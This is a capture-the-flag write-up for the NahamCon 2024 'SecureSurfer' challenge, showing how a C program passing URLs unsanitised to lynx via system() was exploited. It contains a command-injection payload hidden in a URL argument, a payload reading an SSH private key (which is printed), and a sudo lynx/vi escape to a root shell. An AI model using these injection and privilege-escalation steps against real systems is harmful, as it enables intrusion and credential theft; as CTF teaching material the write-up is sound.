---
layout: load_md
title: The White Circle | Nahamcon 2024 | SecureSurfer Writeup
desc: Check out our writeup for SecureSurfer for Nahamcon 2024 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Nahamcon 2024
parent: nahamcon_2024
category: misc
challenge: SecureSurfer
tags: "misc, twh, rce, lpe, privesc"
date: 2024-05-28T00:00:00+00:00
last_modified_at: 2024-05-28T00:00:00+00:00
---


> Solved by : thewhiteh4t


- we are provided with SSH access and a C source code file
- it is a simple C program which contains some cases and a `surf` function
- surf function passes our input without much input validation to `lynx` a console based browser tool
- 5 options have predefined inputs but in 6th option we can provide our input

```c
    case 6:
                    {
                        char url[1024];
                        printf("Online URL: ");
                        fflush(stdout); 
                        fgets(url, sizeof(url), stdin);
                        url[strcspn(url, "\n")] = 0; // Remove newline character
    
                        if (strstr(url, "https://") == NULL) {
                            printf("\nWe are secure here at the SecureSurfer! You must use https:// !\n");
                        } else {
                            surf(url);
                        }
                    }


    void surf(const char *url) {
        char command[512];
        sprintf(command, "/usr/local/bin/lynx --accept_all_cookies -cache=0 -restrictions=all '%s'", url);
        system(command);
        system("stty sane");
    }
```

- only requirement is that our input should contain `https://`
- we can inject commands through our input by using `$()` and single quotes :

```
'$(id)'#https://
```

![](https://i.imgur.com/65qrdco.png)

- so we have command injection, kind of
- now let’s try to drop to a shell : 


![](https://i.imgur.com/VxLvFJH.png)

- we did get a shell but command output is blank, maybe due to how lynx works or some other reason but we can still explore and home dir of `securesurfer` contains a `.ssh` directory, so we can try to look for `id_rsa`


```
securesurfer@securesurfer:~$ cat .ssh/
authorized_keys  id_ecdsa         id_ecdsa.pub
```

- fortunately with lynx we can read files directly!

```
'$(~/.ssh/id_ecdsa)'#https://
```

```
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIIDx0ks2B22N69cy8Vyy2VrNPDdhYTQlKWdVFdanIvydoAoGCCqGSM49
AwEHoUQDQgAEJEgkMpKgbm52oJfCbDLXvX1b3ZWE6j+P5tOdrBH5n/aaRwwZqZtp
7C82/VWBuq6RkSRFspGSlqsgJNG4RHQIRA==
-----END EC PRIVATE KEY-----
```

- now we can directly login and skip the browser on login

```
chmod 600 id_ecdsa
ssh -p 31252 securesurfer@challenge.nahamcon.com -i id_ecdsa
```

![](https://i.imgur.com/NxkhvyI.png)



- after looking into lynx for sometime I came across a useful option : 

```
-editor=EDITOR    enable edit mode with specified editor
```

- on the target box `vi` was available so we can run lynx with sudo and vi as our editor and drop into edit mode and try to launch a bash shell
- we also need a local file for the editor

```
touch a
sudo lynx -editor=vi a
```

- after getting inside lynx we need to press `e` to launch edit mode where `vi` takes over
- and now we can simply use the following to get a shell : 

```
:!/bin/bash
```

![](https://i.imgur.com/gKgA9Cc.png)
